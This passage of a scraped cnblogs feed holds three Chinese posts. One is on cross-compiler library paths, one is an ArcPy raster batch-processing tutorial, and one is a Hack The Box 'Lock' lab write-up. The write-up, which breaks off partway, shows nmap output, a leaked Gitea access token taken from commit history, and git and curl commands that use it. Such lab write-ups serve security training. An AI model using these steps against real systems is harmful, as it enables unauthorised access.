/>\n可以看到红框部分打印出了<code>LIBRARY_PATH</code>这个宏，这个宏就表示的是交叉编译工具在链接时，会到这些路径下去查找库文件，当我们缺少库文件时，可以将库文件拷贝到这些目录下的任意一个路径就行，同样我们也可以自己指定链接库的路径，链接时用<code>-L&lt;path&gt;</code>选项指定，编译时，编译器会优先使用通过<code>-L</code>指定的路径</p>\n<p>当我们已经将需要链接的库拷贝到对应的系统库文件路径下之后，或者我们已经通过<code>-L</code>选项指定了库路径之后，我们想要链接库应该如何操作？例如我们想要链接<code>libpthread.so</code>，那么我们在编译链接时就需要加上<code>-lpthread</code>的编译选项。就可以正常编译程序了。</p>\n<p>到此，我们已经知道了，编译一个开源软件时，如果出现了问题，应该如何查找交叉编译工具的头文件路径和库文件路径，主要用来处理一些开源软件编译过程中，依赖缺失的问题，例如我现在需要编译一个软件，但是缺少其他软件的库依赖，那么我们就需要先交叉编译依赖库，然后将编译出来的库以及对应头文件拷贝到交叉编译工具对应的头文件和库文件的系统目录下，再编译我们的目标软件，这里需要注意的一点就是，编译出来的<code>lib</code>文件，有一些可能是一个库软连接到了另一个库上，所以在拷贝的时候需要使用<code>cp -drf</code>命令来拷贝，避免破坏软连接</p>\n<p>那么通过<code>-I</code>和<code>-L</code>指定路径与将依赖头文件与库拷贝到已有的路径中，有什么区别？区别就是如果使用指定路径的方式，在每次编译的时候都需要重新输一遍路径，这对于只用编译一次的情景还行，如果是之后的应用开发会经常用到这个库，还是建议将库拷贝到交叉编译器默认的系统库和头文件路径中去，避免每次编译的时候都重新敲一遍路径。</p>\n<h2 id=\"13-运行过程中找不到库相关问题\">1.3 运行过程中找不到库相关问题</h2>\n<p>如果在执行可执行程序的时候，出现找不到某各库的问题，说明当前的系统库路径下缺少这个库，只需要将运行需要的库，拷贝到对应的链接库目录下就能解决这个问题</p>\n<pre><code class=\"language-shell\">error while loading shared libraries: libxxx.so:\ncannot open shared object file: No such file or directory\n</code></pre>\n<p>对应的系统库路径在哪？一般系统目录就是板子上的<code>/lib</code>、<code>/usr/lib</code>目录，当前也可以自己指定，运行程序用环境变量 <code>LD_LIBRARY_PATH</code> 指定，执行以下的命令来添加一个新的库路径</p>\n<pre><code class=\"language-shell\">export LD_LIBRARY_PATH=/xxx_dir\n</code></pre>\n<p>程序运行时，并不需要头文件，如果不在开发板上编译，那么头文件不用拷贝到开发板上</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-15 20:48</span>&nbsp;\n<a href=\"https://www.cnblogs.com/ttkwzyttk\">ttkwzyttk</a>&nbsp;\n阅读(<span id=\"post_view_count\">26</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "使用 ArcPy 批量处理栅格数据：重采样与矢量裁剪",
      "link": "https://www.cnblogs.com/Laurentianelle/p/19618450",
      "published": "",
      "description": "<h1 class=\"postTitle\"><a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/Laurentianelle/p/19618450\" id=\"cb_post_title_url\" title=\"发布于 2026-02-15 18:19\">\n    <span>使用 ArcPy 批量处理栅格数据：重采样与矢量裁剪</span>\n    \n\n</a>\n</h1>\n\t<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"使用-arcpy-批量处理栅格数据重采样与矢量裁剪\">使用 ArcPy 批量处理栅格数据：重采样与矢量裁剪</h1>\n<h2 id=\"背景介绍\">背景介绍</h2>\n<p>在地理信息系统（GIS）工作中，我们常常需要处理大量栅格图像文件，比如卫星遥感数据。这些文件分辨率不一、覆盖范围过大，直接使用会让分析卡顿或超出研究区。这时，一个自动化脚本就能帮忙：它像一个“智能裁缝”，批量将文件“裁剪”到合适大小和分辨率，让数据更精炼易用。</p>\n<p>这个脚本针对编程新手设计，只需简单配置，就能处理成堆的TIF文件。特别适合初学者练习ArcPy，快速上手GIS自动化。</p>\n<h2 id=\"代码功能说明\">代码功能说明</h2>\n<p>这个脚本的核心用途是<strong>批量处理栅格TIF文件</strong>，解决手动重采样和裁剪耗时费力的痛点。它会自动扫描输入文件夹中的所有TIF文件，按年份分组，重采样到30米分辨率，然后用指定的矢量边界（SHP文件）裁剪，只保留感兴趣区域，最终保存为新TIF文件。</p>\n<p>适用场景包括：地面沉降监测、土地利用变化分析、环境评估项目——任何需要统一分辨率和区域的遥感数据处理。运行后，你会在终端看到进度提示如“🔄 [1/10] 处理文件: xxx.tif（年份: 2020）”和“✅ 完成：xxx.tif”，输出文件夹中出现按年份命名的裁剪后TIF文件，这些文件体积更小、边界精确，随时可导入ArcGIS查看或进一步分析。</p>\n<h2 id=\"运行环境准备\">运行环境准备</h2>\n<p>准备环境就像为厨师备齐锅碗瓢盆，确保脚本能顺利“下厨”。为什么要做这一步？因为ArcPy依赖ArcGIS软件，没有它脚本就“无米下锅”。</p>\n<ul>\n<li><strong>ArcGIS 版本要求</strong>：ArcGIS Desktop 10.5+ 或 ArcGIS Pro 2.5+（推荐 Pro，更稳定）。\n<ul>\n<li>检查方法：打开ArcGIS，查看“帮助 &gt; 关于”中的版本信息。如果没有，下载安装从 <a href=\"https://www.esri.com/en-us/arcgis/products\" rel=\"noopener nofollow\" target=\"_blank\">esri.com</a>。</li>\n</ul>\n</li>\n<li><strong>Python 环境</strong>：使用ArcGIS自带的Python（通常3.9+），无需额外安装。</li>\n<li><strong>Spatial Analyst 扩展</strong>：脚本需此扩展用于栅格处理。\n<ul>\n<li>授权检查：在ArcGIS中，工具箱 &gt; Spatial Analyst Tools，确保可用。</li>\n</ul>\n</li>\n<li><strong>文件准备</strong>：确保输入TIF文件和SHP边界文件存在，硬盘有足够空间（每个TIF处理可能需几百MB）。</li>\n</ul>\n<p>这些准备好，脚本就能在ArcGIS Python环境中运行。</p>\n<h2 id=\"详细运行步骤\">详细运行步骤</h2>\n<p>我们按顺序拆解运行，像搭乐高一样一步步来。每步解释“为什么”，帮你理解逻辑：这样不是死记硬背，而是知道“为什么这样搭更稳”。</p>\n<ol>\n<li>\n<p><strong>环境准备</strong>：<br />\n为什么？确认工具就位，避免运行时突然报“缺货”。</p>\n<ul>\n<li>启动ArcGIS Pro 或 Desktop，确保Spatial Analyst扩展已授权（在“项目 &gt; 许可 &gt; 扩展”中勾选）。</li>\n<li>准备数据：将你的TIF文件放入一个主文件夹（如包含年份子文件夹的“data”），SHP文件单独保存。</li>\n</ul>\n</li>\n<li>\n<p><strong>依赖安装</strong>：<br />\n为什么？脚本用到的库大多内置，但确认无误能防小问题。</p>\n<ul>\n<li>ArcPy 和 os/re/glob 是标准库，无需pip。</li>\n<li>在ArcGIS Python Command Prompt（从开始菜单搜索）中输入 <code>python -c \"import arcpy; print('OK')\"</code> 测试ArcPy是否可用。如果报错，重启ArcGIS。</li>\n</ul>\n</li>\n<li>\n<p><strong>代码修改</strong>：<br />\n为什么？脚本路径是示例，换成你的才能“对号入座”，否则找不到文件。</p>\n<ul>\n<li>新建文本文件，命名为 <code>batch_raster_process.py</code>，复制下方代码块粘贴。</li>\n<li>用记事本或VS Code打开，修改参数部分：\n<ul>\n<li><strong>注意：运行前需修改</strong> <code>input_root_folder = r\"【your_input_root】\"</code> 为你的TIF主文件夹路径，例如 <code>r\"C:\\GISData\\沉降数据\"</code>。</li>\n<li><strong>注意：运行前需修改</strong> <code>mask_shp = r\"【your_mask_shp】\"</code> 为SHP边界路径，例如 <code>r\"C:\\GISData\\study_area.shp\"</code>。</li>\n<li><strong>注意：运行前需修改</strong> <code>output_folder = r\"【your_output_folder】\"</code> 为输出路径，例如 <code>r\"C:\\Output\\processed\"</code>。</li>\n<li>可选：调整 <code>cell_size = 30</code> 为你的目标分辨率（米）。</li>\n</ul>\n</li>\n<li>保存为UTF-8编码。</li>\n</ul>\n<pre><code class=\"language-python\">import arcpy\nimport os\nimport re\nimport glob\n\n# === 参数设定 ===\ninput_root_folder = r\"【your_input_root】\"          # 包含多个年份子文件夹的主目录\nmask_shp = r\"【your_mask_shp】\"                     # 用于裁剪的面矢量\noutput_folder = r\"【your_output_folder】\"           # 最终输出文件夹\ncell_size = 30                                     # 目标分辨率（米）\nvariable_name = \"kuangshan4\"                       # 变量名作为输出前缀\n\n# === 环境设定 ===\narcpy.env.overwriteOutput = True\narcpy.CheckOutExtension(\"Spatial\")\n\n# 估算地理坐标下的 30 米分辨率（大致）\ncellsize_degree = 0.0002695\n\n# 创建输出文件夹\nif not os.path.exists(output_folder):\n    os.makedirs(output_folder)\n\n# === 搜索所有.tif文件 ===\ntif_list = glob.glob(os.path.join(input_root_folder, \"*\", \"*.tif\"))\ntotal_files = len(tif_list)\nprint(f\"\\n📦 共发现 {total_files} 个 .tif 文件，开始处理...\\n\")\n\n# === 遍历处理 ===\nfor idx, tif_path in enumerate(tif_list, 1):\n    filename = os.path.basename(tif_path)\n    parent_folder = os.path.basename(os.path.dirname(tif_path))\n   \n    # 提取年份\n    year_match = re.search(r\"\\d{4}\", parent_folder)\n    year = year_match.group() if year_match else \"unknown\"\n    print(f\"🔄 [{idx}/{total_files}] 处理文件: {filename}（年份: {year}）\")\n   \n    try:\n        # Step 1: 重采样\n        print(\"   ➤ 步骤 1：重采样至 30m...\")\n        resampled = arcpy.sa.Resample(tif_path, cellsize_degree, \"BILINEAR\")\n       \n        # Step 2: 裁剪\n        print(\"   ➤ 步骤 2：按矢量裁剪...\")\n        clipped = arcpy.sa.ExtractByMask(resampled, mask_shp)\n       \n        # Step 3: 保存结果\n        print(\"   💾 步骤 3：保存输出...\")\n        out_name = f\"{variable_name}_{year}_{os.path.splitext(filename)[0]}.tif\"\n        out_path = os.path.join(output_folder, out_name)\n        arcpy.management.CopyRaster(clipped, out_path, pixel_type=\"32_BIT_FLOAT\")\n        print(f\"   ✅ 完成：{out_name}\\n\")\n    except Exception as e:\n        print(f\"   ❌ 处理失败：{e}\\n\")\n        continue\n\nprint(\"🎉 所有任务已完成！\")\n</code></pre>\n</li>\n<li>\n<p><strong>执行命令</strong>：<br />\n为什么？这是“点火启动”，让脚本开始扫描和处理文件。</p>\n<ul>\n<li>打开ArcGIS Python Command Prompt，导航到脚本目录：输入 <code>cd 【your_script_path】</code>（例如 <code>cd C:\\Scripts</code>）。</li>\n<li>运行命令：<strong><code>python batch_raster_process.py</code></strong>。</li>\n<li>耐心等待（大文件可能需几分钟），终端会显示进度条和完成提示。</li>\n</ul>\n</li>\n<li>\n<p><strong>验证结果</strong>：<br />\n为什么？像试穿衣服，确保“剪裁”后合身无误。</p>\n<ul>\n<li>打开输出文件夹，检查是否生成以年份命名的TIF文件（如 <code>kuangshan4_2020_xxx.tif</code>）。</li>\n<li>在ArcGIS中添加一个输出TIF，查看图层属性：分辨率应为30m，边界匹配SHP范围。</li>\n<li>如果文件数与输入匹配，且无错误提示，即大功告成。</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"核心代码解析\">核心代码解析</h2>\n<p>脚本像一个“流水线工厂”：先“清点货物”（找TIF文件），然后对每个“零件”走三道工序（重采样、裁剪、打包），出错就“隔离”不影响整体。用大白话聊核心逻辑，就如组装玩具车——简单几步，成品就跑起来了。</p>\n<ul>\n<li>\n<p><strong>搜索TIF文件</strong>（<code>tif_list = glob.glob(...)</code>）：<br />\n这行像“仓库管理员”拿着手电筒，在主文件夹及其子文件夹（按年份分）里搜罗所有“.tif”货品，列个清单。为什么？批量处理前得知道“有多少活儿”，避免漏掉文件。</p>\n</li>\n<li>\n<p><strong>提取年份</strong>（<code>year_match = re.search(r\"\\d{4}\", parent_folder)</code>）：<br />\n想象成“标签阅读器”：从文件夹名（如“2020_data”）中抠出“2020”这个数字，当作文件名标签。为什么？这样输出文件带年份，便于后期按时间排序分析。</p>\n</li>\n<li>\n<p><strong>重采样</strong>（<code>resampled = arcpy.sa.Resample(...)</code>）：<br />\n像“放大镜调整器”：把原TIF“拉伸”或“压缩”到30米像素大小，用“BILINEAR”方式平滑过渡（像邻居平均值，避免锯齿）。为什么？统一分辨率，让不同来源的数据“站齐队”。</p>\n</li>\n<li>\n<p><strong>裁剪</strong>（<code>clipped = arcpy.sa.ExtractByMask(...)</code>）：<br />\n这步如“剪刀手”：用SHP边界当“模板”，只切下研究区内的部分，扔掉外围“废料”。为什么？聚焦感兴趣区域，节省存储和计算时间。</p>\n</li>\n<li>\n<p><strong>保存结果</strong>（<code>arcpy.management.CopyRaster(...)</code>）：<br />\n像“打包机”：给文件起名（变量+年份+原名），存为浮点TIF，确保数据精度不丢。为什么？浮点格式保持数值准确，适合沉降等连续数据。</p>\n</li>\n</ul>\n<p>整个流程循环遍历清单，try-except像“安全网”，一个坏了不耽误别人。新手懂了，就能改成加投影或统计功能。</p>\n<h2 id=\"常见问题解决\">常见问题解决</h2>\n<p>跑脚本时，新手常遇小坎坷，但这些是“经验药方”，提前知道就能少走弯路。为什么列出来？因为调试像找钥匙，知道常见藏处更快开门。</p>\n<ul>\n<li>\n<p><strong>路径错误</strong>：</p>\n<ul>\n<li>报错如“No such file or directory”。</li>\n<li>解决：用 <code>r\"路径\"</code>（raw字符串），双检查输入/输出文件夹存在。用文件资源管理器复制完整路径粘贴。为什么？路径敏感，半点斜杠错就找不到家。</li>\n</ul>\n</li>\n<li>\n<p><strong>扩展未授权</strong>：</p>\n<ul>\n<li>报错“CheckOutExtension failed”。</li>\n<li>解决：在ArcGIS许可管理器中启用Spatial Analyst，重启软件。为什么？扩展像VIP门票，没它进不了栅格工坊。</li>\n</ul>\n</li>\n<li>\n<p><strong>分辨率估算不准</strong>：</p>\n<ul>\n<li>输出图像变形或坐标错。</li>\n<li>解决：如果你的TIF是投影坐标，改 <code>cellsize_degree</code> 为实际米值（如直接用 <code>cell_size</code>）。测试小文件先跑。为什么？度坐标下米需转换，投影坐标直接用米更准。</li>\n</ul>\n</li>\n<li>\n<p><strong>内存不足或处理慢</strong>：</p>\n<ul>\n<li>大文件卡死或报“Out of memory”。</li>\n<li>解决：关掉其他程序，处理前分批小文件夹；或加 <code>arcpy.env.workspace = output_folder</code> 优化。为什么？栅格处理吃内存，像大锅煮饭，锅小就分次。</li>\n</ul>\n</li>\n<li>\n<p><strong>其他</strong>：TIF无年份文件夹时，输出名带“unknown”——手动调整文件夹结构。出错时，复制终端错误Google“ArcPy [错误] Resample”。</p>\n</li>\n</ul>\n<p>掌握这些，脚本就是你的得力助手。试跑后，欢迎分享你的GIS小项目！</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n\t<div class=\"postDesc\">posted on \n<span id=\"post-date\">2026-02-15 18:19</span>&nbsp;\n<a href=\"https://www.cnblogs.com/Laurentianelle\">Laurentianelle</a>&nbsp;\n阅读(<span id=\"post_view_count\">22</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "【渗透测试】HTB靶场之Lock 全过程wp",
      "link": "https://www.cnblogs.com/DSchenzi/p/19618342",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/DSchenzi/p/19618342\" id=\"cb_post_title_url\" title=\"发布于 2026-02-15 17:05\">\n    <span>【渗透测试】HTB靶场之Lock 全过程wp</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"lock\">Lock</h1>\n<p><strong>Lock</strong> 是一台简单难度的 Windows 靶机。解题流程包括：枚举 Gitea 仓库找到个人访问令牌（PAT）；利用该令牌在服务器上部署 ASPX 网页后门，从而获得初始立足点；从 mRemoteNG 配置文件中解密出密码，得到新用户账户的登录权限；最后利用 PDF24 程序中的本地提权漏洞，获取 SYSTEM 权限的 Shell。</p>\n<h2 id=\"信息收集\">信息收集</h2>\n<p>目标ip:10.129.234.64</p>\n<p>kali ip:10.10.16.4</p>\n<pre><code class=\"language-kotlin\">┌──(root㉿kali)-[~/桌面/HTB]\n└─# nmap -A -T4 10.129.234.64          \nStarting Nmap 7.95 ( https://nmap.org ) at 2026-02-15 01:34 EST\nNmap scan report for 10.129.234.64\nHost is up (0.30s latency).\nNot shown: 996 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Lock - Index\n| http-methods: \n|_  Potentially risky methods: TRACE\n445/tcp  open  microsoft-ds?\n3000/tcp open  http          Golang net/http server\n|_http-title: Gitea: Git with a cup of tea\n| fingerprint-strings: \n|   GenericLines, Help, RTSPRequest: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest: \n|     HTTP/1.0 200 OK\n|     Cache-Control: max-age=0, private, must-revalidate, no-transform\n|     Content-Type: text/html; charset=utf-8\n|     Set-Cookie: i_like_gitea=74301fab8c80b509; Path=/; HttpOnly; SameSite=Lax\n|     Set-Cookie: _csrf=7YhSALV0ZBSIvHetLhey94Wp5Es6MTc3MTEzNzQyMDEwNTU1NjcwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax\n|     X-Frame-Options: SAMEORIGIN\n|     Date: Sun, 15 Feb 2026 06:37:00 GMT\n|     &lt;!DOCTYPE html&gt;\n|     &lt;html lang=\"en-US\" class=\"theme-auto\"&gt;\n|     &lt;head&gt;\n|     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;\n|     &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt;\n|     &lt;link rel=\"manifest\" href=\"data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU\n|   HTTPOptions: \n|     HTTP/1.0 405 Method Not Allowed\n|     Allow: HEAD\n|     Allow: GET\n|     Cache-Control: max-age=0, private, must-revalidate, no-transform\n|     Set-Cookie: i_like_gitea=c9a200de20c43a71; Path=/; HttpOnly; SameSite=Lax\n|     Set-Cookie: _csrf=_WL4mnt6F0jUe2zby5-7FVfiMSY6MTc3MTEzNzQyMTM0NTI4NDgwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax\n|     X-Frame-Options: SAMEORIGIN\n|     Date: Sun, 15 Feb 2026 06:37:01 GMT\n|_    Content-Length: 0\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2026-02-15T06:38:16+00:00; +1m58s from scanner time.\n| ssl-cert: Subject: commonName=Lock\n| Not valid before: 2026-02-14T06:34:21\n|_Not valid after:  2026-08-16T06:34:21\n| rdp-ntlm-info: \n|   Target_Name: LOCK\n|   NetBIOS_Domain_Name: LOCK\n|   NetBIOS_Computer_Name: LOCK\n|   DNS_Domain_Name: Lock\n|   DNS_Computer_Name: Lock\n|   Product_Version: 10.0.20348\n|_  System_Time: 2026-02-15T06:37:37+00:00\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port3000-TCP:V=7.95%I=7%D=2/15%Time=69916916%P=x86_64-pc-linux-gnu%r(Ge\nSF:nericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t\nSF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x\nSF:20Request\")%r(GetRequest,3000,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nCache-Control:\nSF:\\x20max-age=0,\\x20private,\\x20must-revalidate,\\x20no-transform\\r\\nConte\nSF:nt-Type:\\x20text/html;\\x20charset=utf-8\\r\\nSet-Cookie:\\x20i_like_gitea=\nSF:74301fab8c80b509;\\x20Path=/;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nSet-Cookie\nSF::\\x20_csrf=7YhSALV0ZBSIvHetLhey94Wp5Es6MTc3MTEzNzQyMDEwNTU1NjcwMA;\\x20P\nSF:ath=/;\\x20Max-Age=86400;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nX-Frame-Option\nSF:s:\\x20SAMEORIGIN\\r\\nDate:\\x20Sun,\\x2015\\x20Feb\\x202026\\x2006:37:00\\x20G\nSF:MT\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\"en-US\\\"\\x20class=\\\"theme-\nSF:auto\\\"&gt;\\n&lt;head&gt;\\n\\t&lt;meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=device\nSF:-width,\\x20initial-scale=1\\\"&gt;\\n\\t&lt;title&gt;Gitea:\\x20Git\\x20with\\x20a\\x20c\nSF:up\\x20of\\x20tea&lt;/title&gt;\\n\\t&lt;link\\x20rel=\\\"manifest\\\"\\x20href=\\\"data:app\nSF:lication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYS\nSF:IsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfd\nSF:XJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8v\nSF:bG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmc\nSF:iLCJzaXplcyI6IjU\")%r(Help,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nCon\nSF:tent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\\nSF:r\\n400\\x20Bad\\x20Request\")%r(HTTPOptions,197,\"HTTP/1\\.0\\x20405\\x20Metho\nSF:d\\x20Not\\x20Allowed\\r\\nAllow:\\x20HEAD\\r\\nAllow:\\x20GET\\r\\nCache-Control\nSF::\\x20max-age=0,\\x20private,\\x20must-revalidate,\\x20no-transform\\r\\nSet-\nSF:Cookie:\\x20i_like_gitea=c9a200de20c43a71;\\x20Path=/;\\x20HttpOnly;\\x20Sa\nSF:meSite=Lax\\r\\nSet-Cookie:\\x20_csrf=_WL4mnt6F0jUe2zby5-7FVfiMSY6MTc3MTEz\nSF:NzQyMTM0NTI4NDgwMA;\\x20Path=/;\\x20Max-Age=86400;\\x20HttpOnly;\\x20SameSi\nSF:te=Lax\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Sun,\\x2015\\x20Feb\\\nSF:x202026\\x2006:37:01\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(RTSPRequ\nSF:est,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/pla\nSF:in;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Reque\nSF:st\");\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)\nOS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2026-02-15T06:37:38\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n|_clock-skew: mean: 1m57s, deviation: 0s, median: 1m57s\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT       ADDRESS\n1   349.42 ms 10.10.16.1\n2   349.72 ms 10.129.234.64\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 109.87 seconds\n</code></pre>\n<p>发现开放了4个端口：80、445、3000、3389</p>\n<p><img alt=\"image-20260215144554043\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170442300-1196726848.png\" /></p>\n<p><img alt=\"image-20260215144616821\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170443121-607852831.png\" /></p>\n<p>在左上的探索下，位于公共仓库中有一段python编写的代码</p>\n<p><img alt=\"image-20260215144932716\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170443642-1647566889.png\" /></p>\n<pre><code class=\"language-python\">import requests\nimport sys\nimport os\n\ndef format_domain(domain):\n    if not domain.startswith(('http://', 'https://')):\n        domain = 'https://' + domain\n    return domain\n\ndef get_repositories(token, domain):\n    headers = {\n        'Authorization': f'token {token}'\n    }\n    url = f'{domain}/api/v1/user/repos'\n    response = requests.get(url, headers=headers)\n\n    if response.status_code == 200:\n        return response.json()\n    else:\n        raise Exception(f'Failed to retrieve repositories: {response.status_code}')\n\ndef main():\n    if len(sys.argv) &lt; 2:\n        print(\"Usage: python script.py &lt;gitea_domain&gt;\")\n        sys.exit(1)\n\n    gitea_domain = format_domain(sys.argv[1])\n\n    personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')\n    if not personal_access_token:\n        print(\"Error: GITEA_ACCESS_TOKEN environment variable not set.\")\n        sys.exit(1)\n\n    try:\n        repos = get_repositories(personal_access_token, gitea_domain)\n        print(\"Repositories:\")\n        for repo in repos:\n            print(f\"- {repo['full_name']}\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>\n<p>这是一个用于通过 Gitea API 获取用户仓库列表的 Python 脚本，通过个人访问令牌进行身份验证。</p>\n<p>核心功能<br />\n身份验证：使用 Gitea 个人访问令牌<br />\nAPI 调用：调用 Gitea 的 /api/v1/user/repos端点<br />\n域名处理：自动添加 HTTPS 协议前缀<br />\n仓库展示：输出用户的所有仓库完整名称</p>\n<p><img alt=\"image-20260215145317851\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170443946-1323051577.png\" /></p>\n<p>查看提交历史，可以看到PERSONAL_ACCESS_TOKEN</p>\n<p><img alt=\"image-20260215145336211\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170444290-2025630397.png\" /></p>\n<pre><code class=\"language-kotlin\">PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'\n</code></pre>\n<p>我们将脚本复制到kali里面，并设置环境变量</p>\n<p><img alt=\"image-20260215150556841\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170444621-238580148.png\" /></p>\n<p>我们可以看到有两个仓库：dev-scripts和website</p>\n<p>这里有两个方法</p>\n<p><strong>1.git</strong></p>\n<p>我们已经了解了dev-scripts，所以接下来我们将克隆website仓库。但是现在没有密码，只有token，git允许token当作密码使用，这可以通过使用git clone命令并同时提供访问令牌来完成。</p>\n<pre><code>git clone https://&lt;username&gt;:&lt;token&gt;@&lt;gitea-domain&gt;/&lt;owner&gt;/&lt;repository&gt;.git\n\ngit clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website\n</code></pre>\n<p><img alt=\"image-20260215151010801\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170445070-695726071.png\" /></p>\n<p><img alt=\"image-20260215151141449\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260215170445843-681213167.png\" /></p>\n<p><strong>2.curl</strong></p>\n<pre><code class=\"language-kotlin\">curl http://10.129.234.64:3000/api/v1/user/repos -H \"Authorization: Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f\" -s | jq .\n\n\n[\n  {\n    \"id\": 1,\n    \"owner\": {\n      \"id\": 2,\n      \"login\": \"ellen.freeman\",\n      \"login_name\": \"\",\n      \"full_name\": \"\",\n      \"email\": \"ellen.freeman@lock.vl\",\n      \"avatar_url\": \"http://localhost:3000/avatar/1aea7e43e6bb8891439a37854255ed74\",\n      \"language\": \"\",\n      \"is_admin\": false,\n      \"last_login\": \"0001-01-01T00:00:00Z\",\n      \"created\": \"2023-12-27T11:13:10-08:00\",\n      \"restricted\": false,\n      \"active\": false,\n      \"prohibit_login\": false,\n      \"location\": \"\",\n      \"website\": \"\",\n      \"description\": \"\",\n      \"visibility\": \"public\",\n      \"followers_count\": 0,\n      \"following_count\": 0,\n      \"starred_repos_count\": 0,\n      \"username\": \"ellen.freeman\"\n    },\n    \"name\": \"dev-scripts\",\n    \"full_name\": \"ellen.freeman/dev-scripts\",\n    \"description\": \"\",\n    \"empty\": false,\n    \"private\": false,\n    \"fork\": false,\n    \"template\": false,\n    \"parent\": null,\n    \"mirror\": false,\n    \"size\": 29,\n    \"language\": \"Python\",\n    \"languages_url\": \"http://localhost:3000/api/v1/repos/ellen.freeman/dev-scripts/languages\",\n    \"html_url\": \"http://localhost:3000/ellen.freeman/dev-scripts\",\n    \"url\": \"http://localhost:3000/api/v1/repos/ellen.freeman/dev-scripts\",\n    \"link\": \"\",\n    \"ssh_url\": 